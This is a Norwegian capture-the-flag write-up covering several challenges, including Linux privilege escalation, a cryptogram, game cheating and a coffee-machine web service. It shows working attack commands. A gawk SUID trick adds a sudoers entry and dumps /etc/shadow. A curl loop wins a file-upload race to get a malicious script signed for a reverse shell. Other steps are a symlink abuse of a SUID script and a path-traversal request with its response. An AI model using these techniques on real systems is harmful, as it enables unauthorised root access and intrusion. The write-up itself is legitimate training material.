# Writeup av et utvalg oppgaver


## 1.6 Unchained
Oppgavetekst:
````md
# Unchained

Koble til med SSH med passord: `EnergiskSkjorte`

```sh
ssh support@unchained
```
````
Her var det om å lese en fil som kun root kunne lese. Det viste seg at gawk hadde SUID-bit satt, som betyr at gawk kjører med samme rettigheter som root  
`gawk '//' secret.txt`  
[GTFObins (ressurs for utnyttelse av binærfiler på Linux)](https://gtfobins.github.io/gtfobins/gawk/#file-read)  
Kan også legge oss selv til i /etc/sudoers:
```sh
gawk -v LFILE="/etc/sudoers" '{ a[NR]=$0 } END { a[NR]="support ALL=(ALL) NOPASSWD:ALL"; for(i=1;i<=NR;i++) print a[i] > LFILE }' /etc/sudoers
unchained:/# sudo -i
unchained:/# cat /etc/shadow
root:$6$etHCy/6XfmdLhSIq$ATts7G8fzbza2rah0kLaKU7rIgsQYwt2FM1M6Madizyn7E7iGL739DZz4jf2Cc7HRgunqpCFOsmuXUS3zx0qX1:20438:0:::::
```

<br>
<br>

## 1.8 Kryptogram
Oppgavetekst:
````md
# Kryptogram

Er du vår neste Egil Mørk? Tiden skrus tilbake til den mørke dagen 23. november 1935.

Som det vil sees er knekningen av et kryptogram ingen heksekunst,
men det krever litt tålmodighet og at man prøver seg frem og tar fantasien til hjelp.

Benevnelser og arbeidsmetoder kan kanskje virke litt fremmed i første øyeblikk, 
men setter man seg inn i saken, er den i virkeligheten enkel.

Du kan hente kryptogrammet her: 

```sh
nc kryptogram 1337
```

Besvarelsen du sender inn, finner du i innholdet av meldingen.

````

Denne oppgaven brukte jeg altfor lang tid på...  
Tilkobling til kryptogram ga oss dette kryptogrammet:
`øwbxl hjcbx læxmx fpxfx lmrcb xlpxo rvøpl rlvrc hrjlø cjxøp brdrb xbræs xlxbb xfhxl yxocx lwfxy øvwjf dryxf xjhhy føvæf apxcp jyxjf yxbøb bxfoj jmwfx mjdxf`

Det ble i oppgaveteksten hintet om den mørke dagen 23. november 1935 og Egil Mørk. Etter litt googling fant jeg boken "Svartkammeret", en bok av Alf R. Jacobsen og Egil Mørk. Boken ligger på Nasjonalbibliotekets nettsider: https://www.nb.no/items/62e1214022fd94e36cc425d1bee9542d?page=15&searchText=magasinet.
Her finnes det også søkemuligheter, så jeg søkte på 23. november 1935. Kapittel 2 (side 16) forteller om Aftenpostens A-Magasin denne lørdagen, og om den kryptologiske nøtten Roscher Lund hadde laget for å rekruttere sivile til etteretningstjenesten.

På side 18 ser man noe som ligner veldig på det vi får fra oppgaven:
`æsxic oawbw jfcdø fxfla æføvb rjfyx løwbx ihjcb ximxy yxoxf øbyxf wøoyb wrfxc hfxiv æjmæx fræsx lalyx foawb ølvvfx hxbwf xyøvm xlabx ldrfp lriv`
Og på side 25 i samme bok er fasiten. Så da lagde jeg et alfabet basert på kryptogrammet og løsningen i boken, og brukte samme alfabet for å løse oppgaven. Noen bokstaver var ikke substituert i det hele tatt:

```
aftenposten bemerker en mistenkelig akning i spionasoeaktivitet i byen etter pendelsen fredag
for videre oppdrag brukes kodeordet atterloom fremover
```
Bokstavene ø, j, og h ble i tillegg til å være subsitutter, også brukt som sine faktiske bokstavverdier.

Besvarelsen som skulle sendes inn: `atterloom`

<br>
<br>

## 1.10 Breakout
Oppegavetekst:
````md
# Breakout

Koble til med SSH:

```sh
ssh user1@breakout
```

og bruk passord: `EssensieltFantom`

## Tips

For å bytte bruker inne på maskinen brukes `su - brukernavn`

For hver bruker leter du etter en `.txt` fil med samme navn. Denne inneholder `brukernavn:passord` for neste bruker. 

I enden venter det et flagg.
````

```sh
breakout:~$ ls -la
total 4
dr-x------    1 user1    user1           23 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root            27 Jan  3 12:43 user1.txt
breakout:~$ cat user1.txt
user2:o4gtOGV3RqVdyUsmDKQv
```
Rolig start. Liste ut filer med `ls -la` og lese med `cat`  



```sh
breakout:~$ ls -la
total 4
dr-x------    1 user2    user2           24 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root            27 Jan  3 12:43 .user2.txt
breakout:~$ cat .user2.txt
user3:LBIcoc6SlhBcvu9t0lzT
```
Her må vi bruke flagget `-a` for å liste ut skjulte filer (filer som starter med .)  



```sh
breakout:~$ ls -la
total 4
dr-x------    1 user3    user3           32 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root           184 Dec 16 21:14 note.txt
dr-x-----x    1 root     root            38 Dec 16 21:14 secret_information
breakout:~$ cat note.txt
At long last I found the secret information
It has always been my greatest goal
But at the end of it all I was told
The rumoured super_secret_information
Still remains elusive as ever
breakout:~$ cat secret_information/super_secret_information/
transaction.png  user3.txt
breakout:~$ cat secret_information/super_secret_information/user3.txt
user4:h25zsqs8hir07g7LaDS4
```
user3 har ikke lov til å cd inn i secret_information, men vi kan åpne filer i mappen hvis vi vet hele filstien. `note.txt` inneholder hintet "super_secret_information".
Dette viser seg å være en mappe inni `secret_information`. Hvis vi skriver `secret_information/super_secret_information/` og trykker TAB, får vi opp filene som vi kan åpne.   



```sh
breakout:~$ ls -la
total 4
dr-x--x---    1 user4    nisser          23 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r-----    1 root     nisser          27 Jan  3 12:43 user4.txt
breakout:~$ sudo -l
User user4 may run the following commands on breakout:
    (julenissen) NOPASSWD: /bin/cat
breakout:~$ sudo -u julenissen cat user4.txt
user5:ogjnfkHdpRPmt8XXiSnf
```
`user4.txt` kan kun leses av `root` og brukere i gruppen `nisser`.
user4 kan kjøre cat som brukeren "julenissen", som er medlem av gruppen `nisser`.   



```sh
user5@breakout:~$ /bin/ls -la
total 16
dr-x------    1 user5    user5           23 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r--r--    1 root     root          1195 Dec 16 21:14 .bash_profile
-rw-r--r--    1 root     root           711 Dec 16 21:14 .bashrc
-rw-r--r--    1 root     root            61 Dec 16 21:14 .inputrc
drwxr-xr-x    2 root     root            16 Dec 16 21:14 bin
-rw----r--    1 root     root            27 Jan  3 12:43 user5.txt
user5@breakout:~$ /bin/cat user5.txt
user6:2QOytpVP7wChBxNityXy
```
Her mener jeg å huske at PATH ikke var satt til noe, dermed kunne man ikke skrive kommandoer uten deres fulle sti.  



```sh
~$ ls -la
No whitespace allowed
~$ ls${IFS}-la
total 8
dr-x------    1 user6    user6           33 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r--r--    1 root     root            47 Dec 16 21:14 .bash_profile
dr-x---r-x    1 root     root             6 Dec 16 21:14 bin
-rw----r--    1 root     root            33 Jan  3 12:43 flag.txt
~$ cat${IFS}flag.txt
e7579025bd04dcc762653e31679ss
```
Man kan erstatte mellomrom med `${IFS}`.  

<br>
<br>

## 1.15 Missile Command
Oppgavetekst:
```md
# Missile Command

Spillet virker veldig vanskelig. Kanskje du kan jukse?
```
Dette var en veldig gøy oppgave, kunne gjerne vært større. 

Dette er et 2D-spill hvor målet er å skyte ned alle missilene. Det er game over hvis ett av missilene kommer over til den andre siden. Spillet lar seg ikke vinne uten juks.
Spillet er skrevet i Unity (.NET), som betyr at det lar seg enkelt dekompileres av et verktøy som dnSpy (https://github.com/dnSpy/dnSpy). Med dette verktøyet kan man også endre på metoder og rekompilere spillet med ny funksjonalitet (juks).
Det viser seg at det er flere måter å jukse på, og dermed motta flagget.

I koden henvises det til `SceneManager.LoadScene("Win");`. Når siste missil er skutt ned, lastes scenen "Win" og flagget vises. Det er totalt 16 missiler som skal skytes ned, og spillet er laget slik at det er en forsinkelse (3sek) mellom hver gang brukeren kan skyte. 
Ved å fjerne denne forsinkelsen, kan man skyte flere anti-missiler og dermed vinne spillet.

Dersom man ikke ønsker å spille i det hele tatt, så kan man plassere `SceneManager.LoadScene("Win");` i en av Update()-metodene, og dermed motta flagget med en gang spillet starter.

<br>
<br>

## 1.16 Legend of Vexillum
Oppgavetekst:
```md
# Legend of Vexillum

Vi har funnet et spill laget av en utvikler som nå jobber i GooodGames. Vedlagt er en forumpost, en manual for spillet og selve spillet.

I følge forumposten er sikkerheten på spillet dårlig implementert. Siden utvikleren nå jobber i GooodGames er det mulig at de har implementert noe liknende.

1. Last ned spillet
2. Kjør spillet med `./game legend-of-vexillum.ctf.cybertalent.no 2000`
3. Finn ut av hvordan sikkerheten til spillet er sårbar og vis at denne kan utnyttes ved å komme til siste rom i spillet

NB: Oppgaven kan ikke løses fra corax.
NB: Dersom du spiller og vinner spillet får du et annet flagg.

```

Dette er et tekstbasert "dungeon"-spill, hvor målet er besøke ulike rom og samle og kombinere diverse gjenstander som gir nye gjenstander. 
Når man besøker nye rom, kan man velge å enten se i rommet, gå til en dør eller område, ta en gjenstand eller bruke en eller flere gjenstander. Eksempel på resultat av å se i rommet:
```
dungeon_prison: You are in a cold dark room, the walls are angled out to a point behind you. There is a door in front of you. In the room there is a torch, and a paper.
```
Det var en del rom, så for å gjøre det litt lettere for meg selv, lagde jeg meg en klient i Python hvor jeg kunne besøke rom og brute force kombinasjoner av gjenstander. Selve flagget får man dersom man besøker rommet `eye_room`
```
eye_room: You are in a small, dark room. The only light comes from above, through the ceiling you can see dcee2dbef8ad3dc077ba21dacafb9a97
```

Jeg fant flagget altså relativt kjapt, og antok derfor at det lå et skjult flagg ved fullførelse av spillet. Så jeg kjørte Python-scriptet gjentatte ganger for å produsere nye gjenstander.
```
[+] Used item '@spiked sphere' with '@speaking wall' in room 'central_hall' successfully!
You squeeze the sphere until you pierce the skin. Slowly, the speech begins making sense. It says 'Find the coiled rod in the brightest land and return it to its primordial waters.
```
Til slutt dukket det opp et skjult flagg, og et høflig takk for at jeg fullførte spillet.

<br>
<br>


## 2.6 Cplusminus
Oppgavetekst:
````md
# C+-

Vi fant dette programmet kjørende på infrastrukturen deres, men det virker som om Joe Logan ikke klarte å finne en C++-kompilator i tide, så han bestemte seg for å implementere OOP og virtuelle funksjoner i C? 

Hjelp oss med å finne ut hva de skjuler!

```sh
nc cplusminus 1337
```
````

Programmet var en terminalbasert device manager. Funksjonaliteten begrenset seg til følgende: 
```
----------------- 
1. Add USB Device 
2. Add Mouse Device
3. Remove Device
4. Show Device Info
5. Configure USB Device
6. Exit
```


Her fant jeg en heap exploit som førte til at jeg kunne overskrive addressen på et "Mouse Device"-objekt. 

Hvert objekt inneholder en print-metode, metoden som kjører når brukeren velger alternativ "4: Show Device Info". 
Ufullstendig fjerning av objektet førte til at jeg kunne overskrive adressen til denne print-metoden til metoden "print_flag()" og dermed motta flagget.

<br>
<br>


## 2.8 Flagle
Oppgavetekst:
````md
# Flagle

Bare gjett flagget.

```sh
ssh play@flagle
```
````
Dette var et terminalbasert gjettespill hvor man hadde seks forsøk på å gjette riktig flagg.
Det var satt opp seks rader og 32 kolonner, og for hver rad man fylte inn med hexadecimal fikk man vite hvilke hexadecimal som var i flagget og riktig plassert (grønn farge) og hvilke som ikke fantes i flagget i det hele tatt (hvit farge). Spillet ga ingen informasjon om riktig hexadecimal men feil plassering. Det som var interessant var at etter de seks førsøkene var brukt, fikk vi vite flagget.

Man kunne sikkert ha løst denne ved å spille nok ganger, evt laget et script for å brute force det. Men det faktum at vi fikk se flagget etter forsøkene var brukt opp, var etter min mening et hint om at flagget ble generert basert på en timestamp. Derfor testet jeg dette ved å starte to spill samtidig (eller så samtidig jeg klarte med håp om at det var litt slingringsmonn)
I tmux kan man synkronisere kommoandoer i flere vinduer ved å skrive inn `:set synchronize-panes on`. Dermed kunne jeg ha to vinduer åpne i tmux, og skrive ssh play@flagle og trykke ENTER i det ene vinduet, og det samme ble gjort i det andre vinduet samtidig-ish.
For å teste om jeg hadde fått samme flagg i begge vinduene, skrev jeg for eksempel bare "a" i første rad. Dersom begge vinduene viste at f.eks. "a" var riktig i plasseringene 5,16 og 28, kunne jeg med ganske stor trygghet si at jeg hadde startet to spill med samme flagg. Så da var det bare å bruke opp alle forsøkene i det ene vinduet, notere flagget, og skrive inn flagget i det andre vinduet.


## 2.11 Karapeks
```md
# Karapeks 

Vi har fanget opp følgende melding:

Bob,
I found this old webpage on our local network. Do you know who made it? I can't find which machine is hosting it and it's only pushing out gibberish. The more I talk with it the more of it becomes readable, but I still can't make sense of it.
- Connor Mcdonald

Se om du kan finne nyttig informasjon og få det til å gi mening.

https://karapeks-cube.ctf.cybertalent.no
```

Enkelt brukergrensesnitt der man kan sende inn tekst, og man får tilbake tilsynelatende gibberish. Men etterhvert som man skriver flere forskjellige ord, blir det som man får tilbake mer forståelig. Ved å analysere nettverkstrafikken, kan man se på JWT-tokenet at det sendes inn en liste kalt "words", og hver gang man sender inn ny ord, vokser JWT-tokenet. Så jeg antok at serveren sjekket om listen inneholdt ord som oversatt ble noe av det som var gibberish. Hvis ja, ble det gibberiske ordet byttet ut med det ordet som brukeren hadde sendt inn.
Etter litt manuell testing så jeg at det dukket opp engelske ord, så da sendte jeg inn 466 000 engelske ord (https://raw.githubusercontent.com/dwyl/english-words/refs/heads/master/words.txt).
Denne mengden ord gjorde at når jeg skrev "flag", var den tidligere uleselige teksten oversatt til engelsk og jeg kunne lese at man måtte skrive "open sesame".
Da kom den enda mer uleselig tekst som ikke var oversatt, men man kunne tydelig se hvor flagget var plassert. Alle sifrene i flagget var leselig, så da var det bare å manuelt mappe opp resten av det hexadecimale alfabetet for å få flagget.

<br>
<br>

## 2.19 Kaffemaskin
Oppgavetekst:
````md
# Kaffemaskin

En av kaffemaskinene til GooodGames er tilgjengelig over internett.

Se om du klarer å få tilgang til denne.

Kjør denne fra corax, og åpne URLen i nettleseren din:

```sh
echo "https://$USERID-coffee-machine.ctf.cybertalent.no"
```
````

Dette var den gøyeste oppgaven!
Denne oppgaven besto av flere steg:
* 2.19.1 Kaffemaskin
* 2.19.2 Kaffemaskin ROOT
* 2.19.3 Kaffemaskin SERVER

<br>

### 2.19.1 Kaffemaskin
Første som møter oss er en innloggingsside. Jeg prøver admin:admin, admin:password og noen få andre kombinasjoner før jeg setter i gang med hydra (verktøy for å brute force innloggingssider). Jeg prøve å finne ut av syntaksen til hydra, og ser på HTML-kildekoden for å finne ut hva som må være med. Pluteselig ser jeg kommentaren `<!-- default credentials: admin:coffee -->`, så da var vi inne.

Når vi er logget inn har vi mulighet til å lage kaffe, laste opp bakgrunnbilde og se og endre på filer. Én fil er særlig interessant: "admin_pin.json". Brukergrensesnittet viser også (hvis man aktivt scroller ned) en "Admin"-knapp. Her må man skrive inn "Password". Jeg prøver det som allerede står i "admin_pin.json" for å unngå unødvendig endringer, men får beskjed om at det kun er lov med tall i passordet. Jeg endrer da pinkoden i "admin_pin.json" slik at den ikke inneholder bokstaver.

Eleverer rettigheter, og vi får tilgang på nye funksjoner:
- Vi får nå mulighet til å laste ned kildekoden
- Starte et service-script
- Se og endre på flere filer

Jeg tenker med en gang at service-scriptet er garantert veien inn. Vi kan også endre på hosts-filen, enda et hint om at service-script er veien å gå. Så da er det bare å endre IP-en i hosts-filen slik at `maintenance-server.utlandia` fører til min egen corax, hvor jeg kan serve et ondsinnet service-script.
Men, i følge kildekoden forventer server at service-script er signert med en privat nøkkel. Denne nøkkelen er det kun server som har. Jeg prøvde å se om det var en path traversal for å kunne lese denne nøkkelen, men det fant jeg ikke.

Etter en stund så jeg pluteselig mulighet for å utnytte en `race condition`. Jeg så at assets ble signert med samme private nøkkel når de ble lastet ned. Assets inkluderte også bakgrunnsbilder. Dette betydde at jeg kunne laste opp et ondsinnet service-script som bakgrunn og se hvilken signatur server ga scriptet når jeg hentet "bildet" igjen. 
Koden inneholder et forsøk på å hindre brukere å laste opp andre filer enn PNG, og den klarer jo det på et vis. Men fordi TMP-filen lagres på disk før den sjekker om det faktisk er en PNG (linje 5->linje 23), så kan jeg laste opp et shell-script, laste ned `background_tmp.png` og lese signaturen før TMP-filen blir fjernet (linje 15).
```go
...
1        dstDir := filepath.Join(app.RootPath, "assets", "public", "images", "backgrounds")
2        tmpPath := filepath.Join(dstDir, "background_tmp.png")
3        finalPath := filepath.Join(dstDir, "background.png")
4    
5        if err := writeFileWithMaxSize(tmpPath, bg, maxSize); err != nil {
6        return fmt.Errorf("failed to write tmp background: %w", err)
7        }
8        f, err := os.Open(tmpPath)
9	    if err != nil {
10	    	return fmt.Errorf("failed to open file: %w", err)
11	    }
12	    defer f.Close()
13
14	    if _, err := png.Decode(f); err != nil {
15	    	_ = os.Remove(tmpPath)
16	    	return fmt.Errorf("background is not a png %w", err)
17	    }
...

18     func writeFileWithMaxSize(absPath string, src io.Reader, maxSize int) error {
19	    if maxSize <= 0 {
20		    return fmt.Errorf("maxSize must be > 0")
21	    }
22
23	    dst, err := os.Create(absPath)
24	    if err != nil {
25		    return fmt.Errorf("create %q: %w", absPath, err)
26	    }
```
For at jeg lettere skal kunne vinne kappløpet mot serveren, lager jeg et shell-script (`adhoc_service.sh`) som er tett opp mot 2MB (det meste er bare kommentarer). 
På corax kjører jeg et bash-script som ser slik ut:
```sh
#!/bin/bash

FILE="/home/login/storage/oppdrag/2.19/www/server.py"
PYTHON_SCRIPT="rc.py"

initial_hash=$(md5sum "$FILE")

# Start python script in background
python3 "$PYTHON_SCRIPT" & 1>/dev/null
echo "[*] Exploit started..."
# Loop until file modification time changes
while true; do
    current_hash=$(md5sum "$FILE")
    curl -F "background=@adhoc_service.sh" https://4c25b618d748efe3bf7ee12750c5f218-coffee-machine.ctf.cybertalent.no/config/background -b "session=c1e8a81737e74561d7f66f6fc92f6943"

    if [[ "$current_hash" != "$initial_hash" ]]; then
        echo "File has been edited."
        cp /home/login/storage/oppdrag/2.19/scripts/adhoc_service.sh /home/login/storage/oppdrag/2.19/www/service/adhoc_service.sh
        break
    fi

done

echo "Done."
```
rc.py er et Python-script som prøver kontinuerlig å laste ned `background_tmp.png`. Når den klarer å laste det ned, noterer den verdien til `X_SIGNATURE` og sender den inn til server.py. server.py er et Python-script som legger på riktig signatur i headeren når `adhoc_service.sh` hentes. Dette scriptet inneholder kommandoer som starter et reverse shell tilbake til corax.

Scriptet ovenfor gjør altså flere steg i en uendelig loop frem til vi har fått riktig signatur (vunnet kappløpet mot serveren):
1. Starter rc.py som kontinuerlig prøver å laste ned `background_tmp.png` (i realiteten `adhoc_service.sh`) med tilhørende signatur som server har produsert for oss
2. Laster opp `adhoc_service.sh` som bakgrunnsbilde kontinuerlig i håp om at rc.py i punkt nr.1 klarer å laste ned `background_tmp.png` før den slettes fra server.
3. Når md5summen til server.py er endret, vet vi at rc.py har fått signaturen og oppdatert server.py, og vi har vunnet kappløpet.

Dette går relativt kjapt, og vi kan starte server.py for å serve `adhoc_service.sh`. Deretter trykker vi på "Run service script now", og vi har fått reverse shell.

<br>

### 2.19.2 Kaffemaskin ROOT

Her utnytter jeg den spesiallagde SUID-filen `/usr/local/bin/sync-etc.sh` til å lese filer jeg egentlig ikke har lov til. Filen ser slik ut:
```sh
#!/bin/sh

SRC="$PERSISTENCE_ROOT/data/admin"

cat "$SRC/hosts" > /etc/hosts
cat "$SRC/issue" > /etc/issue
cat "$SRC/motd" > /etc/motd
cat "$SRC/hostname" > /etc/hostname
cat "$SRC/os-release" > /etc/os-release
```
Den er ikke leselig for andre enn root, men det er ganske tydelig hva den gjør basert på hvilke filer man kan endre på i brukergrensesnittet til netttsiden og navnet på filen.

Jeg løste denne deloppgaven ved å bruke symlinks. Ved å lage en symlink fra f.eks. motd som pekte mot /entrypoint.sh, og deretter kjøre `/usr/local/bin/sync-etc.sh` kunne jeg lese fra /etc/motd innholdet i /entrypoint.sh og dermed hvordan flagget til root var formatert. Deretter gjorde jeg det samme for å lese root-flagget.

<br>

### 2.19.3 Kaffemaskin SERVER
https://ilya.app/blog/servemux-and-path-traversal/ 
Bruken av mux i golang er ikke alltid trygt for å hindre path traversal:
```sh
$ curl -v -X CONNECT --path-as-is http://10.244.10.116:9000/service/../../../../../../../../server_flag.txt
*   Trying 10.244.10.116:9000...
* Established connection to 10.244.10.116 (10.244.10.116 port 9000) from 192.168.29.143 port 41156 
* using HTTP/1.x
> CONNECT /service/../../../../../../../../server_flag.txt HTTP/1.1
> Host: 10.244.10.116:9000
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Disposition: attachment; filename=../../../../../../../../server_flag.txt
< Content-Type: application/octet-stream
< X-Content-Type-Options: nosniff
< X-Signature: wInLrDjv5qOd5c9Z3TRuIu8qWw+rpHl3e/MxD57lMQR7CBtoCiVWijcAqDHED0cjfEW4WuHVhaafKHS4NThBRYpOT/p+ITJ/+UL4iJBXphJWpccLZmnDs4cfYBNpC5lq6JVe0Oe5WX0tGlyBAFYEQDuC0a6ZtdPDhNdZUVVJ8kI=
< X-Signature-Alg: rsa-sha256
< Date: Tue, 30 Dec 2025 02:17:26 GMT
< Content-Length: 33
< 
719bd1bc27755dd0b485d7f3a09ad836
```
